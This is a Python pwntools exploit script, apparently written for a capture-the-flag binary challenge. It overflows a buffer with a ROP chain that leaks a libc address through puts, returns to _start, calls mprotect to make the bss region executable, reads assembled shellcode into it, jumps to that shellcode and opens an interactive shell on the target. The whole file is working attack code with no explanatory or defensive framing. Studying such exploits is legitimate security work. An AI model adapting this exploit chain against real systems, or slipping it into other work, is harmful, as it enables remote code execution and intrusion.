#!/usr/bin/python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './parent'  # <-- change this
child = './main'
elf = context.binary = ELF(exe, checksec=True)
forked = context.binary = ELF(child, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337  # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(forked)
    
    pop_rdi_wkwkwkwk = 0x400773 # --> https://ypl.coffee/hidden-gadget/
    
    offset = 12
    rop.raw(b'A' * offset)
    rop.puts(forked.got['puts']) # leak libc
    rop.call(forked.sym['_start'])
    io.sendlineafter(b'>', rop.chain())
    
    io.recvuntil(b'ingfo\n')
    puts = unpack(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = puts - libc.sym['puts']
    info(f'Libc base: {hex(libc.address)}')
    
    rop = ROP(libc)
    
    rop.raw(b'A' * offset)
    rop.call(libc.sym['mprotect'], [0x601000, 0x1000, 7]) # make bss rwx
    rop.call(libc.sym['read'], [0, 0x601100, 0x100]) # read shellcode to bss
    rop.call(0x601100) # jump to shellcode
    
    io.sendlineafter(b'>', rop.chain())
    run("nasm -f bin shellcode.asm -o shellcode.bin", shell=True, check=True)
    shellcode = open("shellcode.bin", "rb").read()
    io.sendline(shellcode)
        
    io.interactive()
    
if __name__ == '__main__':
    exploit()